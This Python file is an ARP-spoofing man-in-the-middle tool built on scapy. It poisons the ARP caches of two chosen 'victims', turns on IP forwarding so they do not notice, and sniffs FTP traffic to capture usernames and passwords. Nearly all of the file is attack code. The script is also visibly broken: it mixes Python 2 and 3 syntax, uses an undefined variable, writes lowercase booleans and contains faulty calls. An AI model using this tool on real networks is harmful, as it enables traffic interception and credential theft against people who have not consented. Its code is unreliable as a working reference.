from scapy.all import *
import sys
import os

print("\n\n    -------------------WELCOME TO SCAPY AS MITM---------------------")
print("     ----------------------Ritz & TheGX 2020----------------------\n\n")
print("   Before: \n")
print("         ____________                        ____________")
print("        |  victim 1  |--------------------->|  victim 2  |")
print("         ____________ <--------------------- ____________\n")
print("   After: \n")
print("         ____________              _______             ____________")
print("        |  victim 1  |----------->|  you  |---------->|  victim 2  |")
print("         ____________ <----------- _______ <---------- ____________\n")

usersFTP=['']
passwordsFTP=['']

def getMAC(IP, interface):

    conf.verb=0
    ans, unans = srp(Ether( dst= "ff:ff:ff:ff:ff:ff")/ARP(pdst=IP), timeout=10, iface=interface, inter=0.1) 
    for snd,rcv in ans:
        return rcv.sprintf(r"%Ether.src%")
def doTheMess(victim_1ip, victim_2ip, victim1Mac, victim2Mac):

    send(ARP(op=2, pdst=victim_1ip, psrc= victim_2ip, hwdst= victim1Mac)) #op=2 because it's a reply
    send(ARP(op=2, pdst=victim_2ip, psrc= victim_1ip, hwdst= victim2Mac))


def cleanMess(victim_1ip, victim_2ip, interface):

    print("\nCleaning...\n")
    victim1Mac=getMAC(victim_1ip, interface)
    victim2Mac=getMAC(victim_2ip, interface)

    send(ARP(op=2 , pdst= victim_2ip, psrc=victim_1ip, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=victim1Mac), count=7)
    send(ARP(op=2 , pdst= victim_1ip, psrc=victim_2ip, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=victim2Mac), count=7)

    try:
        os_type = input("\nIf you use linux type 1, if you use macos type 0\n")
    except KeyboardInterrupt:
        print("\n\nStop typing random commands and gimme type of os")
        sys.exit(1)

    print("Disabling ip forwarding...\n")

    if(os_type=='0'): os.system("sudo sysctl -w net.inet.ip.forwarding=0")
    else: os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")

    print("Bye!")
    sys.exit(1)


def checkLogin(packet, user, password):
    try:
        if '230' in packet[Raw].load: #230 it's the code for a valid login 
            print 'Valid Credentials Found... '
            print '\t[*] ' + str(pkt[IP].dst).strip() + ' -> ' + str(pkt[IP].src).strip() + ':'
            print '\t   [*] Username: ' + user
            print '\t   [*] Password: ' + password + '\n'
            return
        else:
            return
    except Exception:
        return  

#maybe this function can be done via sniff filter, check that later
def checkIfFTPPacket(packet):

    if packet.haslayer(TCP) and pkt.haslayer(Raw): #haslayer returns true if said cls layer is on the packet  
        if packet[TCP].sport==21 or packet[TCP].sport==21: #FTP connection to server is done via port 21 (not 20!!! thats for data)
            return true
        else:
            return false
    else:
        return false

def checkPacket(packet):

    if checkIfFTPPacket(packet):
        pass #aka continue
    else: 
        return #if not a FTP packet, return
    
    data=packet[Raw].load

    if 'USER ' in data:
        usersFTP.append(data.split('USER ')[1].strip())
    elif 'PASS ' in data:
        passwordsFTP.append(data.split('PASS ')[1].strip())
    else:
        checkLogin(packet, usersFTP[-1], passwordsFTP[-1]) #checks if previously user and pass stored is a valid login
    return


def FTPSniffer(interface):

    print("Starting FTP Sniffer...\n")

    try:
        sniff(iface=interface, prn=checkPacket, store=0) #prn specifies the function to apply to a received packet and store=0 to discard them 
    except Exception:
        print("Failed to init FTP sniffing. Cleaning MESS\n")
        cleanMess
        sys.exit(1)

def chooseAttack():

    print("Which type of communication you want to sniff? (and maybe do more...)\n")


    try:
        typeOfAttack=input("Press 1 for FTP, 2 for SNMP and 3 for Telnet")

        if(typeOfAttack==1):
            FTPSniffer()

    except KeyboardInterrupt:
        print("Stop typing random commands and gimme number\n")
        cleanMess()
        sys.exit(1)



def MITM():

    #we start by ping broadcasting our entire LAN to fill the arp table
    #so we can know the IP and MAC address of all hosts
    try:
        IpBroadcast= input("Type the broadcast IP: ") # TODO: automatic
        interface = input("Type the interface name: ")
    except KeyboardInterrupt:
        print("\n\nStop typing random commands and gimme IP broadcast")
        sys.exit(1)

    ping_command = "ping -b {} -c 10".format(IpBroadcast)
    os.system(ping_command)

    os.system("sleep 5")
    print("\n\n\nAvailable hosts: \n")

    arp_command = "arp -i {} -a".format(interface)
    os.system(arp_command)
    # getting info victim

    try:
        victim_1ip= input("\nType victim 1 IP:")
        victim_2ip= input("\nType victim 2 IP:")
    except KeyboardInterrupt:
        print("\n\nStop typing random commands and gimme victims'ip")
        sys.exit(1)

    victim1Mac=getMAC(victim_1ip, interface)
    victim2Mac=getMAC(victim_2ip, interface)
    #allowing ip forwarding since the attacker must work in such a way the victims don't know they are being attacked

    try:
        os_type = input("\nIf you use linux type 1, if you use macos type 0\n")
    except KeyboardInterrupt:
        print("\n\nStop typing random commands and gimme type of os")
        sys.exit(1)

    print("Enabling ip forwarding...\n")

    if(os_type=='0'): os.system("sudo sysctl -w net.inet.ip.forwarding=1")
    else: os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")

    print(victim1Mac)
    print(victim2Mac)

    print("Doing the mess...\n")

    doTheMess(victim_1ip, victim_2ip,victim1Mac, victim2Mac)

    chooseAttack()
   
    try:
        input("Type control-c to escape\n")
    except KeyboardInterrupt:
        cleanMess(victim_1ip, victim_2ip, interface)
        pass
            

MITM()